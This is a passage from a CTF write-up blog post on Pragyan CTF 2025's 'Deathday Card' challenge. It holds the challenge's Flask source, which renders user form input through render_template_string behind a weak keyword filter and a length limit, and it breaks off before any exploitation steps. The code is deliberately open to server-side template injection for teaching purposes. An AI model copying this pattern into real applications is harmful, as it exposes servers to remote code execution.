<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Pragyan - Deathday Card" />
<meta name="author" content="Anas" />
<meta property="og:locale" content="en" />
<meta name="description" content="Introduction Pragyan CTF 2025 Description Enumeration Reading Source Code Identifying vulnerabilities" />
<meta property="og:description" content="Introduction Pragyan CTF 2025 Description Enumeration Reading Source Code Identifying vulnerabilities" />
<link rel="canonical" href="http://localhost:4000/posts/pragyan-deathdaycard/" />
<meta property="og:url" content="http://localhost:4000/posts/pragyan-deathdaycard/" />
<meta property="og:site_name" content="NullBrunk" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-02-08T16:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Pragyan - Deathday Card" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Anas","url":"https://github.com/NullBrunk/"},"dateModified":"2025-02-09T18:25:45+00:00","datePublished":"2025-02-08T16:00:00+00:00","description":"Introduction Pragyan CTF 2025 Description Enumeration Reading Source Code Identifying vulnerabilities","headline":"Pragyan - Deathday Card","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/pragyan-deathdaycard/"},"url":"http://localhost:4000/posts/pragyan-deathdaycard/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Pragyan - Deathday Card | NullBrunk
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="NullBrunk">
<meta name="application-name" content="NullBrunk">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/favicons/logo.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">NullBrunk</a>
    <p class="site-subtitle fst-italic mb-0">Web pentester, CTF player.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
          
          <li class="nav-item">
            <a href="/ctfs/" class="nav-link">
              <i class="fa-fw fas fa-flag"></i>
              

              <span>CTFS</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/tools/" class="nav-link">
              <i class="fa-fw fas fas fa-code"></i>
              

              <span>TOOLS</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/prog/" class="nav-link">
              <i class="fa-fw fas fa-screwdriver-wrench"></i>
              

              <span>PROG</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/tags/" class="nav-link">
              <i class="fa-fw fas fa-tags"></i>
              

              <span>TAGS</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/about/" class="nav-link">
              <i class="fa-fw fas fa-info-circle"></i>
              

              <span>ABOUT</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
        
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap justify-content-center align-items-center w-100">
    <a href="https://ctftime.org/user/157452" aria-label="github" target="_blank" rel="noopener noreferrer">
      <i class="fa-regular fa-font-awesome"></i>
    </a>


    
      

      
        <a
          href="https://www.root-me.org/NullBrunk?q=%2FNullbrunk"
          aria-label="root-me"
          

          

          

          
        >
          <i class="fas fa-skull"></i>
        </a>
      
    
      

      
        <a
          href="https://github.com/nullbrunk"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://www.linkedin.com/in/anas-idiri-b05733229"
          aria-label="linkedin"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-linkedin"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!--  include topbar.html lang=lang -->

        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11   col-xl-9  px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  




<!-- return -->










<header id="topbar-wrapper" aria-label="Top Bar">
    <div id="topbar" class="d-flex align-items-center justify-content-between h-100" >
        <nav id="breadcrumb" aria-label="Breadcrumb">
            <span><a href="/">Home</a></span>
             

            
                <span>
                 <a href="/categories/writeups/">Writeups</a>
                </span>
            
                <span>
                 <a href="/categories/ctftime2025/">CTFTime2025</a>
                </span>
            
                <span>
                 <a href="/categories/pragyan/">Pragyan</a>
                </span>
            

             
             
            

            
             
            
            <span>Pragyan - Deathday Card</span>
        </nav>
    </div>
</header>

<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>Pragyan - Deathday Card</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1739030400"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Feb  8, 2025
</time>

      </span>

      <!-- lastmod date -->
      
        <span>
          Updated
          <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1739125545"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Feb  9, 2025
</time>

        </span>
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                <a href="https://github.com/NullBrunk/">Anas</a>
                
              
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1447 words"
>
  <em>8 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">Pragyan - Deathday Card</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">Pragyan - Deathday Card</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <ol>
  <li>Introduction
    <ul>
      <li><a href="#pragyan-ctf-2025">Pragyan CTF 2025</a></li>
      <li><a href="#description">Description</a></li>
    </ul>
  </li>
  <li>Enumeration
    <ul>
      <li><a href="#reading-source-code">Reading Source Code</a></li>
      <li><a href="#identifying-vulnerabilities">Identifying vulnerabilities</a></li>
    </ul>
  </li>
  <li>Exploitation
    <ul>
      <li><a href="#verifying-ssti">Verifying SSTI</a></li>
      <li><a href="#bypassing-restriction">Bypassing restriction</a>
        <ul>
          <li><a href="#theory">Theory</a></li>
          <li><a href="#practice">Practive</a></li>
        </ul>
      </li>
      <li><a href="#scripting">Scripting</a></li>
      <li><a href="#getting-the-flag">Getting the Flag</a></li>
    </ul>
  </li>
</ol>

<hr />

<h1 id="introduction">Introduction</h1>

<h3 id="pragyan-ctf-2025"><span class="me-2">Pragyan CTF 2025</span><a href="#pragyan-ctf-2025" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>We finished top 10 as a duo with my friend <a href="https://blog.hitc.at/">h1tc4t</a>.</p>

<p><a href="/assets/img/writeups/DeathdayCard/score.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/DeathdayCard/score.png" alt="index"  loading="lazy"></a></p>

<h3 id="description"><span class="me-2">Description</span><a href="#description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<blockquote>
  <p>you could have done some work around for birthday but not this………..</p>
</blockquote>

<h1 id="enumeration">Enumeration</h1>

<h3 id="reading-source-code"><span class="me-2">Reading Source Code</span><a href="#reading-source-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Source code was provided with the challenge description:</p>

<details id="appjs">
  <summary>app.py</summary>

  <div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">abort</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">redirect</span>
<span class="kn">import</span> <span class="n">builtins</span> <span class="k">as</span> <span class="n">_b</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">os</span>


<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">getenv</span><span class="p">(</span><span class="sh">"</span><span class="s">APP_SECRET_KEY</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">default_app_secret</span><span class="sh">"</span><span class="p">)</span>
<span class="n">env</span> <span class="o">=</span> <span class="n">app</span><span class="p">.</span><span class="n">jinja_env</span>


<span class="n">KEY</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">getenv</span><span class="p">(</span><span class="sh">"</span><span class="s">APP_SECRET_KEY</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">default_secret_key</span><span class="sh">"</span><span class="p">)</span>



<span class="k">class</span> <span class="nc">validator</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">security</span><span class="p">():</span>
        <span class="k">return</span> <span class="n">_b</span>
    <span class="k">def</span> <span class="nf">security1</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">):</span>
        <span class="k">if</span> <span class="sh">'</span><span class="s">validator</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">a</span> <span class="ow">or</span> <span class="sh">'</span><span class="s">validator</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">b</span> <span class="ow">or</span> <span class="sh">'</span><span class="s">validator</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">c</span> <span class="ow">or</span> <span class="sh">'</span><span class="s">validator</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">d</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">False</span>
        <span class="k">elif</span> <span class="sh">'</span><span class="s">os</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">a</span> <span class="ow">or</span> <span class="sh">'</span><span class="s">os</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">b</span> <span class="ow">or</span> <span class="sh">'</span><span class="s">os</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">c</span> <span class="ow">or</span> <span class="sh">'</span><span class="s">os</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">d</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">False</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">True</span>
    
    <span class="k">def</span> <span class="nf">security2</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">):</span>
        <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">50</span> <span class="ow">and</span> <span class="nf">len</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">50</span> <span class="ow">and</span> <span class="nf">len</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">50</span> <span class="ow">and</span> <span class="nf">len</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">50</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">True</span>
        <span class="k">else</span> <span class="p">:</span>
            <span class="k">return</span> <span class="bp">False</span>
        


<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">personalized_card</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">:</span>
        <span class="k">return</span> <span class="sh">"""</span><span class="s">
        &lt;link rel=</span><span class="sh">"</span><span class="s">stylesheet</span><span class="sh">"</span><span class="s"> href=</span><span class="sh">"</span><span class="s">static/style.css</span><span class="sh">"</span><span class="s">&gt;
        &lt;link href=</span><span class="sh">"</span><span class="s">https://fonts.googleapis.com/css?family=Poppins:300,400,600&amp;display=swap</span><span class="sh">"</span><span class="s"> rel=</span><span class="sh">"</span><span class="s">stylesheet</span><span class="sh">"</span><span class="s">&gt;
        &lt;div class=</span><span class="sh">"</span><span class="s">container</span><span class="sh">"</span><span class="s">&gt;
            &lt;div class=</span><span class="sh">"</span><span class="s">card-generator</span><span class="sh">"</span><span class="s">&gt;
                &lt;h1&gt;Personalized Card Generator&lt;/h1&gt;
                &lt;form action=</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="s"> method=</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="s">&gt;
                    &lt;label for=</span><span class="sh">"</span><span class="s">sender</span><span class="sh">"</span><span class="s">&gt;Sender</span><span class="sh">'</span><span class="s">s Name:&lt;/label&gt;
                    &lt;input type=</span><span class="sh">"</span><span class="s">text</span><span class="sh">"</span><span class="s"> id=</span><span class="sh">"</span><span class="s">sender</span><span class="sh">"</span><span class="s"> name=</span><span class="sh">"</span><span class="s">sender</span><span class="sh">"</span><span class="s"> placeholder=</span><span class="sh">"</span><span class="s">Your name</span><span class="sh">"</span><span class="s"> required maxlength=</span><span class="sh">"</span><span class="s">50</span><span class="sh">"</span><span class="s">&gt;
                    &lt;label for=</span><span class="sh">"</span><span class="s">recipient</span><span class="sh">"</span><span class="s">&gt;Recipient</span><span class="sh">'</span><span class="s">s Name:&lt;/label&gt;
                    &lt;input type=</span><span class="sh">"</span><span class="s">text</span><span class="sh">"</span><span class="s"> id=</span><span class="sh">"</span><span class="s">recipient</span><span class="sh">"</span><span class="s"> name=</span><span class="sh">"</span><span class="s">recipient</span><span class="sh">"</span><span class="s"> placeholder=</span><span class="sh">"</span><span class="s">Recipient</span><span class="sh">'</span><span class="s">s name</span><span class="sh">"</span><span class="s"> required maxlength=</span><span class="sh">"</span><span class="s">50</span><span class="sh">"</span><span class="s">&gt;
                    &lt;label for=</span><span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="s">&gt;Message:&lt;/label&gt;
                    &lt;input type=</span><span class="sh">"</span><span class="s">text</span><span class="sh">"</span><span class="s"> id=</span><span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="s"> name=</span><span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="s"> placeholder=</span><span class="sh">"</span><span class="s">Your message</span><span class="sh">"</span><span class="s"> required maxlength=</span><span class="sh">"</span><span class="s">50</span><span class="sh">"</span><span class="s">&gt;
                    &lt;label for=</span><span class="sh">"</span><span class="s">message_final</span><span class="sh">"</span><span class="s">&gt;Final Message:&lt;/label&gt;
                    &lt;input type=</span><span class="sh">"</span><span class="s">text</span><span class="sh">"</span><span class="s"> id=</span><span class="sh">"</span><span class="s">message_final</span><span class="sh">"</span><span class="s"> name=</span><span class="sh">"</span><span class="s">message_final</span><span class="sh">"</span><span class="s"> placeholder=</span><span class="sh">"</span><span class="s">Final words</span><span class="sh">"</span><span class="s"> required maxlength=</span><span class="sh">"</span><span class="s">50</span><span class="sh">"</span><span class="s">&gt;
                    &lt;button type=</span><span class="sh">"</span><span class="s">submit</span><span class="sh">"</span><span class="s">&gt;Generate Card&lt;/button&gt;
                &lt;/form&gt;
            &lt;/div&gt;
        &lt;/div&gt;
        </span><span class="sh">"""</span>

    <span class="k">elif</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">recipient</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">recipient</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span>
            <span class="n">sender</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">sender</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span>
            <span class="n">message</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span>
            <span class="n">final_message</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">message_final</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">validator</span><span class="p">.</span><span class="nf">security1</span><span class="p">(</span><span class="n">recipient</span><span class="p">,</span> <span class="n">sender</span><span class="p">,</span> <span class="n">message</span><span class="p">,</span> <span class="n">final_message</span><span class="p">)</span> <span class="ow">and</span> <span class="n">validator</span><span class="p">.</span><span class="nf">security2</span><span class="p">(</span><span class="n">recipient</span><span class="p">,</span> <span class="n">sender</span><span class="p">,</span> <span class="n">message</span><span class="p">,</span> <span class="n">final_message</span><span class="p">):</span>
                <span class="n">template</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"""</span><span class="s">
                    &lt;link rel=</span><span class="sh">"</span><span class="s">stylesheet</span><span class="sh">"</span><span class="s"> href=</span><span class="sh">"</span><span class="s">static/style.css</span><span class="sh">"</span><span class="s">&gt;
                    &lt;link href=</span><span class="sh">"</span><span class="s">https://fonts.googleapis.com/css?family=Poppins:300,400,600&amp;display=swap</span><span class="sh">"</span><span class="s"> rel=</span><span class="sh">"</span><span class="s">stylesheet</span><span class="sh">"</span><span class="s">&gt;
                    &lt;div class=</span><span class="sh">"</span><span class="s">container</span><span class="sh">"</span><span class="s">&gt;
                        &lt;div class=</span><span class="sh">"</span><span class="s">card-preview</span><span class="sh">"</span><span class="s">&gt;
                            &lt;h1&gt;Your Personalized Card&lt;/h1&gt;
                            &lt;div class=</span><span class="sh">"</span><span class="s">card</span><span class="sh">"</span><span class="s">&gt;
                                &lt;h2&gt;From: </span><span class="si">{</span><span class="n">sender</span><span class="si">}</span><span class="s">&lt;/h2&gt;
                                &lt;h2&gt;To: </span><span class="si">{</span><span class="n">recipient</span><span class="si">}</span><span class="s">&lt;/h2&gt;
                                &lt;p&gt;</span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="s">&lt;/p&gt;
                                &lt;h1&gt;</span><span class="si">{</span><span class="n">final_message</span><span class="si">}</span><span class="s">&lt;/h1&gt;
                            &lt;/div&gt;
                            &lt;a class=</span><span class="sh">"</span><span class="s">new-card-link</span><span class="sh">"</span><span class="s"> href=</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="s">&gt;Create Another Card&lt;/a&gt;
                        &lt;/div&gt;
                    &lt;/div&gt;
                </span><span class="sh">"""</span>
            <span class="k">else</span> <span class="p">:</span>
                <span class="n">template</span><span class="o">=</span><span class="sh">"</span><span class="s">either the recipient or sender or message input is more than 50 letters</span><span class="sh">"</span>

            <span class="n">app</span><span class="p">.</span><span class="n">jinja_env</span> <span class="o">=</span> <span class="n">env</span>    
            <span class="n">app</span><span class="p">.</span><span class="n">jinja_env</span><span class="p">.</span><span class="nb">globals</span><span class="p">.</span><span class="nf">update</span><span class="p">({</span>
                <span class="sh">'</span><span class="s">validator</span><span class="sh">'</span><span class="p">:</span> <span class="nf">validator</span><span class="p">()</span>
            <span class="p">})</span>
            <span class="k">return</span> <span class="nf">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>

        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">return</span> <span class="sa">f</span><span class="sh">"""</span><span class="s">
